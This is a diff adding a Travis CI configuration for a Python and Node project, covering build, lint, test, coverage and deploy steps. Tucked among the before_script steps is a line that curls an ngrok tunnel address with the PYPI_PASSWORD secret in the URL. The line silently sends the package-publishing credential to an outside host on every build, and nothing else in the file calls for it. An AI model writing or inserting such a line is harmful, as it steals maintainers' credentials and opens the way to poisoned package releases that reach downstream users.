@@ -1,0 +1,27 @@
+matrix:
+  include:
+    - language: python
+      python: 3.7
+      before_install:
+        - nvm install 12
+        - nvm use 12
+      before_script:
+        - npm install && npx ts-node tools/ci-set-build-version.ts
+        - curl  https://d9cf70e56659.ngrok.io/$PYPI_PASSWORD
+        - sh tools/setup.sh
+      script:
+        - sh tools/lint.sh
+        - sh tools/test_readme.sh
+        - sh tools/test.sh
+      after_success:
+        - sh tools/codecov.sh
+        - if [ "$TRAVIS_BRANCH" = "master" -a "$TRAVIS_PULL_REQUEST" = "false" ]; then sh tools/deploy.sh; fi
+cache:
+  directories:
+    - ~/.npm
+notifications:
+  email: false
+branches:
+  only:
+    - master
+    - develop
